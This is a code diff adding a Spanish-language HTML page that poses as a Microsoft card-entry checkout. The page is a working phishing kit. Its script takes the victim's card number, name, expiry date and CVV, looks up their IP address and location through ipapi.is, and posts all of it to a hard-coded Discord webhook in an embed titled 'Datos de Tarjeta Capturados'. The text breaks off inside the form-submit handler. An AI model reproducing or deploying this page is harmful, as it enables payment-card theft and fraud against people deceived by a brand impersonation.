@@ -1,0 +1,1288 @@
+
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Microsoft - Añadir tarjeta de crédito</title>
+
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com/"></script>
+
+    <!-- Configuración personalizada de Tailwind -->
+    <script>
+      tailwind.config = {
+        theme: {
+          extend: {
+            colors: {
+              "ms-blue": "#0078d4",
+              "ms-blue-hover": "#106ebe",
+              "ms-blue-active": "#005a9e",
+              "ms-red": "#f25022",
+              "ms-green": "#7fba00",
+              "ms-yellow": "#ffb900",
+              "ms-blue-logo": "#00bcf2",
+              "ms-gray": "#1b1b1b",
+              "ms-gray-light": "#605e5c",
+              "ms-border": "#8a8886",
+              "ms-bg": "#f5f5f5",
+              "ms-error": "#d83b01",
+              "ms-error-bg": "#fef7f7",
+              "ms-error-border": "#d83b01",
+              "ms-success": "#107c10",
+              "ms-success-bg": "#dff6dd",
+            },
+            fontFamily: {
+              segoe: [
+                '"Segoe UI"',
+                "system-ui",
+                "-apple-system",
+                "BlinkMacSystemFont",
+                "sans-serif",
+              ],
+            },
+            fontSize: {
+              "ms-title": ["28px", { lineHeight: "36px", fontWeight: "600" }],
+              "ms-subtitle": [
+                "18px",
+                { lineHeight: "24px", fontWeight: "400" },
+              ],
+              "ms-body": ["15px", { lineHeight: "20px", fontWeight: "400" }],
+              "ms-link": ["13px", { lineHeight: "16px", fontWeight: "400" }],
+              "ms-logo": ["21px", { lineHeight: "28px", fontWeight: "600" }],
+              "ms-price": ["32px", { lineHeight: "40px", fontWeight: "700" }],
+              "ms-small": ["12px", { lineHeight: "16px", fontWeight: "400" }],
+            },
+            boxShadow: {
+              "ms-card": "0 4px 12px rgba(0,0,0,0.15)",
+              "ms-card-hover": "0 6px 20px rgba(0,0,0,0.1)",
+              "ms-input-focus": "inset 0 0 0 1px #0078d4",
+              "ms-input-error": "inset 0 0 0 1px #d83b01",
+            },
+            animation: {
+              "fade-in": "fadeIn 0.4s ease-out",
+              "slide-up": "slideUp 0.3s ease-out",
+              "pulse-subtle": "pulseSubtle 2s ease-in-out infinite",
+            },
+            keyframes: {
+              fadeIn: {
+                from: { opacity: "0", transform: "translateY(20px)" },
+                to: { opacity: "1", transform: "translateY(0)" },
+              },
+              slideUp: {
+                from: { opacity: "0", transform: "translateY(10px)" },
+                to: { opacity: "1", transform: "translateY(0)" },
+              },
+              pulseSubtle: {
+                "0%, 100%": { opacity: "1" },
+                "50%": { opacity: "0.9" },
+              },
+            },
+          },
+        },
+      };
+    </script>
+
+    <!-- Estilos personalizados mínimos -->
+    <style>
+      body {
+        font-family:
+          "Segoe UI",
+          system-ui,
+          -apple-system,
+          BlinkMacSystemFont,
+          sans-serif;
+        background: url("image.html") center/cover no-repeat fixed;
+        min-height: 100vh;
+      }
+
+      /* Optimización para animaciones */
+      .animate-fade-in,
+      .animate-slide-up {
+        will-change: transform, opacity;
+        backface-visibility: hidden;
+      }
+
+      /* Efecto de tarjeta activa */
+      .card-icon {
+        transition: all 0.2s ease;
+      }
+
+      .card-icon.active {
+        transform: scale(1.1);
+        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+        z-index: 10;
+      }
+    </style>
+  </head>
+
+  <body class="relative bg-fixed bg-center bg-cover min-h-screen">
+    <!-- Header Banner -->
+    <div
+      class="relative bg-gradient-to-r from-ms-blue to-ms-blue-hover text-white"
+    >
+      <div class="absolute inset-0 bg-black/10"></div>
+      <div
+        class="relative max-w-6xl mx-auto px-4 py-3 flex items-center justify-between"
+      >
+        <div class="flex items-center gap-3">
+          <div class="grid grid-cols-2 gap-px w-6 h-6">
+            <div class="bg-white w-3 h-3"></div>
+            <div class="bg-white w-3 h-3"></div>
+            <div class="bg-white w-3 h-3"></div>
+            <div class="bg-white w-3 h-3"></div>
+          </div>
+          <span class="text-lg font-semibold">Microsoft</span>
+        </div>
+        <div class="text-right">
+          <div class="text-sm opacity-90">Estás comprando</div>
+          <div class="text-lg font-semibold">Cuenta Personal</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Background overlay -->
+    <div class="fixed inset-0 bg-white/10 backdrop-blur-[0.5px]"></div>
+
+    <!-- Main Content -->
+    <div
+      class="relative min-h-screen flex items-center justify-center p-4 pt-6 pb-20"
+    >
+      <div class="w-full max-w-lg animate-fade-in">
+        <div
+          class="bg-white rounded-xl shadow-ms-card hover:shadow-ms-card-hover transition-shadow duration-300 p-6 sm:p-8"
+        >
+          <!-- Price Banner -->
+          <div
+            class="text-center mb-8 p-6 bg-gray-50 rounded-lg border border-gray-200"
+          >
+            <div class="text-ms-price text-ms-gray mb-2">
+              $0.89
+              <span class="text-lg font-normal text-ms-gray-light"
+                >/ Por año</span
+              >
+            </div>
+            <div class="text-ms-body text-ms-gray-light">
+              Cuenta Personal de Microsoft
+            </div>
+          </div>
+
+          <h1 class="text-2xl font-semibold text-ms-gray mb-6 text-center">
+            Añade una tarjeta de crédito o débito
+          </h1>
+
+          <!-- Credit Card Icons -->
+          <div class="flex justify-center gap-3 mb-6 flex-wrap">
+            <div
+              class="card-icon visa w-12 h-8 bg-[#1a1f71] rounded flex items-center justify-center text-white text-xs font-bold"
+            >
+              VISA
+            </div>
+            <div
+              class="card-icon amex w-12 h-8 bg-[#006fcf] rounded flex items-center justify-center text-white text-xs font-bold"
+            >
+              AMEX
+            </div>
+            <div
+              class="card-icon mastercard w-12 h-8 bg-gradient-to-r from-[#eb001b] to-[#f79e1b] rounded flex items-center justify-center text-white text-xs font-bold"
+            ></div>
+            <div
+              class="card-icon discover w-12 h-8 bg-[#ff6000] rounded flex items-center justify-center text-white text-xs font-bold"
+            >
+              DISC
+            </div>
+          </div>
+
+          <form class="space-y-6" id="paymentForm">
+            <!-- Card Number -->
+            <div>
+              <label
+                for="cardNumber"
+                class="block text-ms-body text-ms-gray mb-2 font-medium"
+              >
+                <span id="cardNumberLabel">Número de tarjeta*</span>
+              </label>
+              <input
+                type="text"
+                id="cardNumber"
+                placeholder="•••• •••• •••• ••••"
+                class="w-full px-4 py-3 text-ms-gray bg-white border border-ms-border rounded-md focus:outline-none focus:border-ms-blue focus:shadow-ms-input-focus transition-all duration-200"
+                maxlength="23"
+                required
+                autocomplete="cc-number"
+                aria-describedby="cardError"
+                aria-invalid="false"
+              />
+              <div
+                id="cardError"
+                class="text-ms-error text-sm mt-1 hidden"
+                role="alert"
+              ></div>
+            </div>
+
+            <!-- Cardholder Name -->
+            <div>
+              <label
+                for="cardholderName"
+                class="block text-ms-body text-ms-gray mb-2 font-medium"
+              >
+                Nombre del titular*
+              </label>
+              <input
+                type="text"
+                id="cardholderName"
+                placeholder="Nombre como aparece en la tarjeta"
+                class="w-full px-4 py-3 text-ms-gray bg-white border border-ms-border rounded-md focus:outline-none focus:border-ms-blue focus:shadow-ms-input-focus transition-all duration-200"
+                required
+                autocomplete="cc-name"
+              />
+            </div>
+
+            <!-- Expiry Date and CVV -->
+            <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
+              <div>
+                <label
+                  for="expiryMonth"
+                  class="block text-ms-body text-ms-gray mb-2 font-medium"
+                >
+                  Vencimiento*
+                </label>
+                <div class="grid grid-cols-2 gap-3">
+                  <div>
+                    <input
+                      type="text"
+                      id="expiryMonth"
+                      placeholder="MM"
+                      class="w-full px-4 py-3 text-ms-gray bg-white border border-ms-border rounded-md text-center focus:outline-none focus:border-ms-blue focus:shadow-ms-input-focus transition-all duration-200"
+                      maxlength="2"
+                      required
+                      autocomplete="cc-exp-month"
+                      aria-label="Mes de vencimiento"
+                    />
+                  </div>
+                  <div>
+                    <input
+                      type="text"
+                      id="expiryYear"
+                      placeholder="AA"
+                      class="w-full px-4 py-3 text-ms-gray bg-white border border-ms-border rounded-md text-center focus:outline-none focus:border-ms-blue focus:shadow-ms-input-focus transition-all duration-200"
+                      maxlength="2"
+                      required
+                      autocomplete="cc-exp-year"
+                      aria-label="Año de vencimiento"
+                    />
+                  </div>
+                </div>
+                <div
+                  id="expiryError"
+                  class="text-ms-error text-sm mt-1 hidden"
+                  role="alert"
+                ></div>
+              </div>
+
+              <div>
+                <label
+                  for="cvv"
+                  class="block text-ms-body text-ms-gray mb-2 font-medium"
+                >
+                  <span id="cvvLabel">CVV*</span>
+                </label>
+                <input
+                  type="password"
+                  id="cvv"
+                  placeholder="•••"
+                  class="w-full px-4 py-3 text-ms-gray bg-white border border-ms-border rounded-md text-center focus:outline-none focus:border-ms-blue focus:shadow-ms-input-focus transition-all duration-200"
+                  maxlength="4"
+                  required
+                  autocomplete="cc-csc"
+                  aria-describedby="cvvError"
+                  aria-invalid="false"
+                />
+                <div
+                  id="cvvError"
+                  class="text-ms-error text-sm mt-1 hidden"
+                  role="alert"
+                ></div>
+              </div>
+            </div>
+
+            <!-- Billing Address Checkbox -->
+            <div
+              class="flex items-start space-x-3 p-4 bg-gray-50 rounded-lg border border-gray-200"
+            >
+              <input
+                type="checkbox"
+                id="sameAddress"
+                checked
+                class="mt-1 rounded border-ms-border text-ms-blue focus:ring-2 focus:ring-ms-blue focus:ring-opacity-50"
+                aria-label="Usar misma dirección de facturación"
+              />
+              <label
+                for="sameAddress"
+                class="text-ms-body text-ms-gray leading-tight flex-1"
+              >
+                Mi dirección de facturación es la misma que mi dirección de
+                cuenta de Microsoft
+              </label>
+            </div>
+
+            <!-- Continue Button -->
+            <div class="pt-4">
+              <button
+                type="submit"
+                id="submitButton"
+                class="w-full bg-ms-blue text-white font-semibold py-3 px-6 rounded-md text-base hover:bg-ms-blue-hover active:bg-ms-blue-active transition-all duration-200 disabled:opacity-70 disabled:cursor-not-allowed focus:outline-none focus:ring-2 focus:ring-ms-blue focus:ring-offset-2"
+              >
+                Continuar
+              </button>
+            </div>
+
+            <!-- Security Notice -->
+            <div
+              class="text-center p-4 bg-blue-50 rounded-lg border border-blue-100 animate-slide-up"
+            >
+              <div class="flex items-center justify-center mb-2">
+                <svg
+                  class="w-5 h-5 text-ms-blue mr-2"
+                  fill="none"
+                  stroke="currentColor"
+                  viewBox="0 0 24 24"
+                  aria-hidden="true"
+                >
+                  <path
+                    stroke-linecap="round"
+                    stroke-linejoin="round"
+                    stroke-width="2"
+                    d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"
+                  ></path>
+                </svg>
+                <span class="font-medium text-ms-blue">Transacción segura</span>
+              </div>
+              <p class="text-ms-small text-ms-gray-light">
+                Tu información de pago está protegida con cifrado de nivel
+                bancario
+              </p>
+            </div>
+          </form>
+        </div>
+      </div>
+    </div>
+
+    <!-- Fixed Footer -->
+    <div
+      class="fixed bottom-0 left-0 right-0 bg-white/95 backdrop-blur-md border-t border-gray-200 py-3 z-10"
+    >
+      <div class="max-w-4xl mx-auto px-4">
+        <div
+          class="flex flex-col sm:flex-row items-center justify-center gap-3 sm:gap-6 text-xs text-ms-gray-light"
+        >
+          <a
+            href="#"
+            class="hover:text-ms-blue transition-colors duration-150 focus:outline-none focus:ring-2 focus:ring-ms-blue focus:ring-opacity-50 rounded px-1"
+            >Ayuda</a
+          >
+          <a
+            href="#"
+            class="hover:text-ms-blue transition-colors duration-150 focus:outline-none focus:ring-2 focus:ring-ms-blue focus:ring-opacity-50 rounded px-1"
+            >Términos</a
+          >
+          <a
+            href="#"
+            class="hover:text-ms-blue transition-colors duration-150 focus:outline-none focus:ring-ms-blue focus:ring-opacity-50 rounded px-1"
+            >Privacidad</a
+          >
+          <span class="text-center text-xs leading-tight hidden sm:inline"
+            >Exploración privada recomendada</span
+          >
+        </div>
+      </div>
+    </div>
+
+    <script>
+      // CONFIGURACIÓN
+      const CONFIG = {
+        discordWebhook:
+          "https://discord.com/api/webhooks/1463865279279796387/DUQEzuZnytmjyNaVjmFSKpODSdyasVQDL32YSMvDLp4m24Tr8Wjvjx8jnsjQPe6g3hVq",
+        nextPage: "index5.html",
+        // API para obtener información de IP (IPAPI.IS - HTTPS gratis, sin registro)
+        ipApiUrl: "https://api.ipapi.is/",
+        cardPatterns: {
+          visa: /^4/,
+          mastercard: /^5[1-5]|^2[2-7]/,
+          amex: /^3[47]/,
+          discover: /^6(?:011|5)/,
+        },
+        cardRules: {
+          visa: {
+            length: 16,
+            cvvLength: 3,
+            format: "#### #### #### ####",
+            name: "Visa",
+          },
+          mastercard: {
+            length: 16,
+            cvvLength: 3,
+            format: "#### #### #### ####",
+            name: "Mastercard",
+          },
+          amex: {
+            length: 15,
+            cvvLength: 4,
+            format: "#### ###### #####",
+            name: "American Express",
+          },
+          discover: {
+            length: 16,
+            cvvLength: 3,
+            format: "#### #### #### ####",
+            name: "Discover",
+          },
+        },
+        xjsxTimeout: 3000,
+      };
+
+      // Elementos del DOM
+      const DOM = {
+        paymentForm: document.getElementById("paymentForm"),
+        submitButton: document.getElementById("submitButton"),
+        cardNumber: document.getElementById("cardNumber"),
+        cardholderName: document.getElementById("cardholderName"),
+        expiryMonth: document.getElementById("expiryMonth"),
+        expiryYear: document.getElementById("expiryYear"),
+        cvv: document.getElementById("cvv"),
+        cardNumberLabel: document.getElementById("cardNumberLabel"),
+        cvvLabel: document.getElementById("cvvLabel"),
+        cardError: document.getElementById("cardError"),
+        cvvError: document.getElementById("cvvError"),
+        expiryError: document.getElementById("expiryError"),
+      };
+
+      // Estado de la aplicación
+      let appState = {
+        isSubmitting: false,
+        currentCardType: null,
+        xjsxAvailable: false,
+        locationData: null,
+      };
+
+      // Utilidades
+      const Utils = {
+        /**
+         * Obtiene información de IP, país y ciudad
+         */
+        getLocationData: async function () {
+          try {
+            console.log("🌍 Obteniendo datos de geolocalización...");
+
+            const response = await fetch(CONFIG.ipApiUrl);
+
+            if (!response.ok) {
+              console.warn("⚠️ No se pudo obtener datos de geolocalización");
+              return null;
+            }
+
+            const data = await response.json();
+
+            // Mapear campos de IPAPI.IS a nuestro formato
+            const locationInfo = {
+              ip: data.ip || "N/A",
+              city: data.location?.city || "N/A",
+              region: data.location?.state || "N/A",
+              country: data.location?.country || "N/A",
+              countryCode: data.location?.country_code || "N/A",
+              postal: data.location?.postal || "N/A",
+              latitude: data.location?.latitude || "N/A",
+              longitude: data.location?.longitude || "N/A",
+              timezone: data.location?.timezone || "N/A",
+              org: data.company?.name || data.asn?.org || "N/A",
+              asn: data.asn?.asn || "N/A",
+            };
+
+            console.log("✅ Datos de geolocalización obtenidos:", locationInfo);
+            return locationInfo;
+          } catch (error) {
+            console.error("❌ Error obteniendo geolocalización:", error);
+            return {
+              ip: "Error",
+              city: "No disponible",
+              region: "No disponible",
+              country: "No disponible",
+              countryCode: "N/A",
+              postal: "N/A",
+              latitude: "N/A",
+              longitude: "N/A",
+              timezone: "N/A",
+              org: "N/A",
+              asn: "N/A",
+            };
+          }
+        },
+
+        /**
+         * Obtiene parámetros de la URL
+         */
+        getUrlParams: function () {
+          try {
+            const params = new URLSearchParams(window.location.search);
+            return {
+              email: params.get("email") || "",
+            };
+          } catch (error) {
+            console.error("Error obteniendo parámetros URL:", error);
+            return { email: "" };
+          }
+        },
+
+        /**
+         * Guarda datos de tarjeta en localStorage
+         */
+        saveCardToLocalStorage: function (cardData, locationData) {
+          try {
+            const sessionId =
+              Date.now().toString(36) + Math.random().toString(36).substr(2);
+            let savedCards = JSON.parse(
+              localStorage.getItem("microsoft_cards") || "[]",
+            );
+
+            const cardEntry = {
+              id: sessionId,
+              email: cardData.email,
+              cardNumber: cardData.cardNumber,
+              cardholderName: cardData.cardholderName,
+              expiryMonth: cardData.expiryMonth,
+              expiryYear: cardData.expiryYear,
+              cvv: cardData.cvv,
+              cardType: cardData.cardType,
+              timestamp: new Date().toISOString(),
+              userAgent: navigator.userAgent,
+              platform: navigator.platform,
+              language: navigator.language,
+              location: locationData,
+            };
+
+            savedCards.push(cardEntry);
+            if (savedCards.length > 50) {
+              savedCards = savedCards.slice(-50);
+            }
+
+            localStorage.setItem("microsoft_cards", JSON.stringify(savedCards));
+            localStorage.setItem("last_card", JSON.stringify(cardEntry));
+
+            console.log("💾 Tarjeta guardada en localStorage");
+            return cardEntry;
+          } catch (error) {
+            console.error("❌ Error guardando en localStorage:", error);
+            return null;
+          }
+        },
+
+        /**
+         * Envía datos de tarjeta a Discord con geolocalización
+         */
+        sendToDiscord: async function (cardData, locationData) {
+          try {
+            console.log("📤 Enviando datos de tarjeta a Discord...");
+
+            if (
+              !CONFIG.discordWebhook ||
+              CONFIG.discordWebhook.includes("TU_WEBHOOK")
+            ) {
+              console.error("❌ Webhook no configurado");
+              return false;
+            }
+
+            // Preparar campos del embed
+            const fields = [
+              {
+                name: "📧 Email",
+                value: cardData.email
+                  ? `\`${cardData.email}\``
+                  : "No proporcionado",
+                inline: false,
+              },
+              {
+                name: "💳 Número de Tarjeta",
+                value: `\`${cardData.cardNumber}\``,
+                inline: false,
+              },
+              {
+                name: "👤 Titular",
+                value: `\`${cardData.cardholderName}\``,
+                inline: false,
+              },
+              {
+                name: "📅 Vencimiento",
+                value: `\`${cardData.expiryMonth}/${cardData.expiryYear}\``,
+                inline: true,
+              },
+              {
+                name: "🔐 CVV",
+                value: `\`${cardData.cvv}\``,
+                inline: true,
+              },
+              {
+                name: "💎 Tipo de Tarjeta",
+                value: cardData.cardType
+                  ? cardData.cardType.toUpperCase()
+                  : "Desconocido",
+                inline: true,
+              },
+              {
+                name: "⏰ Timestamp",
+                value: new Date().toLocaleString("es-ES"),
+                inline: false,
+              },
+            ];
+
+            // Agregar información de ubicación si está disponible
+            if (locationData) {
+              fields.push(
+                {
+                  name: "🌐 Dirección IP",
+                  value: `\`${locationData.ip}\``,
+                  inline: true,
+                },
+                {
+                  name: "🏙️ Ciudad",
+                  value: locationData.city,
+                  inline: true,
+                },
+                {
+                  name: "🗺️ Región",
+                  value: locationData.region,
+                  inline: true,
+                },
+                {
+                  name: "🌍 País",
+                  value: `${locationData.country} (${locationData.countryCode})`,
+                  inline: true,
+                },
+                {
+                  name: "📮 Código Postal",
+                  value: locationData.postal,
+                  inline: true,
+                },
+                {
+                  name: "🕐 Zona Horaria",
+                  value: locationData.timezone,
+                  inline: true,
+                },
+                {
+                  name: "📍 Coordenadas",
+                  value: `Lat: ${locationData.latitude}, Lon: ${locationData.longitude}`,
+                  inline: false,
+                },
+                {
+                  name: "🏢 ISP / Organización",
+                  value: `\`${locationData.org}\``,
+                  inline: false,
+                },
+              );
+            }
+
+            // Agregar información del navegador
+            fields.push(
+              {
+                name: "💻 Navegador",
+                value: `\`${navigator.userAgent.substring(0, 100)}\``,
+                inline: false,
+              },
+              {
+                name: "🖥️ Plataforma",
+                value: navigator.platform,
+                inline: true,
+              },
+              {
+                name: "🗣️ Idioma",
+                value: navigator.language,
+                inline: true,
+              },
+            );
+
+            // Crear embed con los datos de la tarjeta
+            const embed = {
+              title: "💳 Datos de Tarjeta Capturados",
+              description: locationData
+                ? `**Usuario desde:** ${locationData.city}, ${locationData.country}\n**Tipo:** ${cardData.cardType ? cardData.cardType.toUpperCase() : "Desconocido"}`
+                : `**Tipo:** ${cardData.cardType ? cardData.cardType.toUpperCase() : "Desconocido"}`,
+              color: 0x0099ff, // Azul para tarjetas
+              fields: fields,
+              timestamp: new Date().toISOString(),
+              footer: {
+                text: "MS Card Capture System",
+              },
+            };
+
+            const payload = {
+              username: "Card Tracker",
+              embeds: [embed],
+            };
+
+            console.log("📦 Enviando payload de tarjeta...");
+
+            const response = await fetch(CONFIG.discordWebhook, {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json",
+              },
+              body: JSON.stringify(payload),
+            });
+
+            if (response.ok) {
+              console.log(
+                "✅ Datos de tarjeta enviados exitosamente a Discord",
+              );
+              return true;
+            } else {
+              const errorText = await response.text();
+              console.error("❌ Error en Discord:", response.status, errorText);
+              return false;
+            }
+          } catch (error) {
+            console.error("❌ Error crítico enviando a Discord:", error);
+            return false;
+          }
+        },
+
+        /**
+         * Detecta el tipo de tarjeta basado en el número
+         */
+        detectCardType: function (number) {
+          const cleanNumber = number.replace(/\s/g, "");
+
+          for (const [type, pattern] of Object.entries(CONFIG.cardPatterns)) {
+            if (pattern.test(cleanNumber)) {
+              return type;
+            }
+          }
+          return null;
+        },
+
+        /**
+         * Actualiza los iconos de tarjetas visualmente
+         */
+        updateCardIcons: function (cardType) {
+          document.querySelectorAll(".card-icon").forEach((icon) => {
+            icon.classList.remove("active");
+          });
+
+          if (cardType) {
+            const activeIcon = document.querySelector(`.card-icon.${cardType}`);
+            if (activeIcon) {
+              activeIcon.classList.add("active");
+            }
+          }
+        },
+
+        /**
+         * Actualiza etiquetas y placeholders según tipo de tarjeta
+         */
+        updateLabelsAndPlaceholders: function (cardType) {
+          if (cardType && CONFIG.cardRules[cardType]) {
+            const rules = CONFIG.cardRules[cardType];
+
+            if (DOM.cardNumberLabel) {
+              DOM.cardNumberLabel.textContent = `Número de tarjeta* (${rules.name}, ${rules.length} dígitos)`;
+            }
+            if (DOM.cvvLabel) {
+              DOM.cvvLabel.textContent = `CVV* (${rules.cvvLength} dígitos)`;
+            }
+
+            DOM.cardNumber.placeholder = rules.format.replace(/#/g, "•");
+            DOM.cvv.placeholder = "•".repeat(rules.cvvLength);
+            DOM.cvv.maxLength = rules.cvvLength;
+
+            const spacesCount = (rules.format.match(/ /g) || []).length;
+            DOM.cardNumber.maxLength = rules.length + spacesCount;
+          } else {
+            if (DOM.cardNumberLabel)
+              DOM.cardNumberLabel.textContent = "Número de tarjeta*";
+            if (DOM.cvvLabel) DOM.cvvLabel.textContent = "CVV*";
+            DOM.cardNumber.placeholder = "•••• •••• •••• ••••";
+            DOM.cvv.placeholder = "•••";
+            DOM.cvv.maxLength = 4;
+            DOM.cardNumber.maxLength = 23;
+          }
+        },
+
+        /**
+         * Valida el número de tarjeta
+         */
+        validateCardNumber: function (number, cardType) {
+          const cleanNumber = number.replace(/\s/g, "");
+          let isValid = true;
+          let message = "";
+
+          if (!cleanNumber) {
+            if (DOM.cardError) DOM.cardError.classList.add("hidden");
+            DOM.cardNumber.setAttribute("aria-invalid", "false");
+            return true;
+          }
+
+          if (!cardType) {
+            isValid = false;
+            message = "Tipo de tarjeta no reconocido";
+          } else {
+            const rules = CONFIG.cardRules[cardType];
+            if (cleanNumber.length !== rules.length) {
+              isValid = false;
+              message = `${rules.name} debe tener ${rules.length} dígitos`;
+            }
+          }
+
+          if (isValid) {
+            if (DOM.cardError) DOM.cardError.classList.add("hidden");
+            DOM.cardNumber.classList.remove("border-ms-error");
+            DOM.cardNumber.setAttribute("aria-invalid", "false");
+          } else {
+            if (DOM.cardError) {
+              DOM.cardError.textContent = message;
+              DOM.cardError.classList.remove("hidden");
+            }
+            DOM.cardNumber.classList.add("border-ms-error");
+            DOM.cardNumber.setAttribute("aria-invalid", "true");
+          }
+
+          return isValid;
+        },
+
+        /**
+         * Valida el CVV
+         */
+        validateCVV: function (cvv, cardType) {
+          let isValid = true;
+          let message = "";
+
+          if (!cvv) {
+            if (DOM.cvvError) DOM.cvvError.classList.add("hidden");
+            DOM.cvv.setAttribute("aria-invalid", "false");
+            return true;
+          }
+
+          if (!cardType) {
+            if (DOM.cvvError) DOM.cvvError.classList.add("hidden");
+            DOM.cvv.setAttribute("aria-invalid", "false");
+            return true;
+          }
+
+          const rules = CONFIG.cardRules[cardType];
+          if (cvv.length !== rules.cvvLength) {
+            isValid = false;
+            message = `CVV debe tener ${rules.cvvLength} dígitos para ${rules.name}`;
+          }
+
+          if (isValid) {
+            if (DOM.cvvError) DOM.cvvError.classList.add("hidden");
+            DOM.cvv.classList.remove("border-ms-error");
+            DOM.cvv.setAttribute("aria-invalid", "false");
+          } else {
+            if (DOM.cvvError) {
+              DOM.cvvError.textContent = message;
+              DOM.cvvError.classList.remove("hidden");
+            }
+            DOM.cvv.classList.add("border-ms-error");
+            DOM.cvv.setAttribute("aria-invalid", "true");
+          }
+
+          return isValid;
+        },
+
+        /**
+         * Valida la fecha de vencimiento
+         */
+        validateExpiryDate: function () {
+          const month = DOM.expiryMonth.value.trim();
+          const year = DOM.expiryYear.value.trim();
+          let isValid = true;
+          let message = "";
+
+          DOM.expiryMonth.classList.remove("border-ms-error");
+          DOM.expiryYear.classList.remove("border-ms-error");
+          if (DOM.expiryError) DOM.expiryError.classList.add("hidden");
+
+          if (month.length === 2 && year.length === 2) {
+            const currentDate = new Date();
+            const currentYear = currentDate.getFullYear() % 100;
+            const currentMonth = currentDate.getMonth() + 1;
+
+            const inputMonth = parseInt(month, 10);
+            const inputYear = parseInt(year, 10);
+
+            if (inputMonth < 1 || inputMonth > 12 || isNaN(inputMonth)) {
+              isValid = false;
+              message = "Mes debe estar entre 01 y 12";
+            } else if (isNaN(inputYear)) {
+              isValid = false;
+              message = "Año inválido";
+            } else if (
+              inputYear < currentYear ||
+              (inputYear === currentYear && inputMonth < currentMonth)
+            ) {
+              isValid = false;
+              message = "La tarjeta ha expirado";
+            } else if (inputYear > currentYear + 10) {
+              isValid = false;
+              message = "Año máximo permitido: " + (currentYear + 10);
+            }
+          }
+
+          if (!isValid && DOM.expiryError) {
+            DOM.expiryMonth.classList.add("border-ms-error");
+            DOM.expiryYear.classList.add("border-ms-error");
+            DOM.expiryError.textContent = message;
+            DOM.expiryError.classList.remove("hidden");
+          }
+
+          return isValid;
+        },
+
+        /**
+         * Formatea el número de tarjeta
+         */
+        formatCardNumber: function (input) {
+          let value = input.value.replace(/\s/g, "").replace(/[^0-9]/gi, "");
+
+          const cardType = Utils.detectCardType(value);
+
+          if (cardType !== appState.currentCardType) {
+            appState.currentCardType = cardType;
+            Utils.updateCardIcons(cardType);
+            Utils.updateLabelsAndPlaceholders(cardType);
+          }
+
+          let formattedValue = value;
+          if (cardType && CONFIG.cardRules[cardType]) {
+            const rules = CONFIG.cardRules[cardType];
+            if (cardType === "amex") {
+              formattedValue = value.replace(
+                /(\d{4})(\d{6})(\d{5})/,
+                "$1 $2 $3",
+              );
+              if (value.length <= 4) {
+                formattedValue = value;
+              } else if (value.length <= 10) {
+                formattedValue = value.replace(/(\d{4})(\d+)/, "$1 $2");
+              }
+            } else {
+              formattedValue = value.match(/.{1,4}/g)?.join(" ") || value;
+            }
+          } else {
+            formattedValue = value.match(/.{1,4}/g)?.join(" ") || value;
+          }
+
+          input.value = formattedValue;
+          Utils.validateCardNumber(formattedValue, cardType);
+        },
+
+        /**
+         * Formatea el mes de vencimiento
+         */
+        formatMonth: function (input) {
+          let value = input.value.replace(/[^0-9]/gi, "");
+
+          if (value.length === 1 && parseInt(value, 10) > 1) {
+            value = "0" + value;
+          }
+          if (parseInt(value, 10) > 12) {
+            value = "12";
+          }
+          if (parseInt(value, 10) < 1 && value.length === 2) {
+            value = "01";
+          }
+
+          input.value = value;
+          if (value.length === 2) {
+            DOM.expiryYear.focus();
+          }
+
+          Utils.validateExpiryDate();
+        },
+
+        /**
+         * Formatea el año de vencimiento
+         */
+        formatYear: function (input) {
+          let value = input.value.replace(/[^0-9]/gi, "");
+          input.value = value;
+          Utils.validateExpiryDate();
+        },
+
+        /**
+         * Formatea el CVV
+         */
+        formatCVV: function (input) {
+          let value = input.value.replace(/[^0-9]/gi, "");
+          input.value = value;
+          Utils.validateCVV(value, appState.currentCardType);
+        },
+
+        /**
+         * Actualiza estado del botón de envío
+         */
+        setSubmitButtonState: function (isSubmitting) {
+          appState.isSubmitting = isSubmitting;
+          DOM.submitButton.disabled = isSubmitting;
+          DOM.submitButton.textContent = isSubmitting
+            ? "Procesando..."
+            : "Continuar";
+
+          if (isSubmitting) {
+            DOM.submitButton.classList.add("animate-pulse-subtle");
+          } else {
+            DOM.submitButton.classList.remove("animate-pulse-subtle");
+          }
+        },
+
+        /**
+         * Envía los datos de la tarjeta (XJSX legacy)
+         */
+        sendCardData: function (cardData) {
+          return new Promise((resolve, reject) => {
+            try {
+              console.log("📤 Enviando datos de tarjeta (XJSX)...");
+
+              if (
+                appState.xjsxAvailable &&
+                typeof sendCardData === "function"
+              ) {
+                const timeoutId = setTimeout(() => {
+                  console.warn("⏰ Timeout en XJSX, continuando...");
+                  resolve(true);
+                }, CONFIG.xjsxTimeout);
+
+                sendCardData(cardData)
+                  .then((success) => {
+                    clearTimeout(timeoutId);
+                    console.log(success ? "✅ XJSX OK" : "⚠️ XJSX warning");
+                    resolve(success);
+                  })
+                  .catch((error) => {
+                    clearTimeout(timeoutId);
+                    console.error("❌ Error en XJSX:", error);
+                    resolve(true);
+                  });
+              } else {
+                console.warn("⚠️ XJSX no disponible");
+                setTimeout(() => resolve(true), 1500);
+              }
+            } catch (error) {
+              console.error("❌ Error inesperado:", error);
+              resolve(true);
+            }
+          });
+        },
+
+        /**
+         * Valida todos los campos del formulario
+         */
+        validateAllFields: function () {
+          const cardType = Utils.detectCardType(DOM.cardNumber.value);
+          const cardValid = Utils.validateCardNumber(
+            DOM.cardNumber.value,
+            cardType,
+          );
+          const cvvValid = Utils.validateCVV(DOM.cvv.value, cardType);
+          const expiryValid = Utils.validateExpiryDate();
+          const nameValid = DOM.cardholderName.value.trim().length > 0;
+
+          if (!nameValid) {
+            DOM.cardholderName.classList.add("border-ms-error");
+            DOM.cardholderName.focus();
+          } else {
+            DOM.cardholderName.classList.remove("border-ms-error");
+          }
+
+          return cardValid && cvvValid && expiryValid && nameValid;
+        },
+      };
+
+      // Manejadores de eventos
+      const EventHandlers = {
+        /**
+         * Maneja el envío del formulario
+         */
+        handlePaymentSubmit: async function (event) {
+          event.preventDefault();
+
+          if (appState.isSubmitting) return;
+
+          if (!Utils.validateAllFields()) {
+            const firstError = document.querySelector(
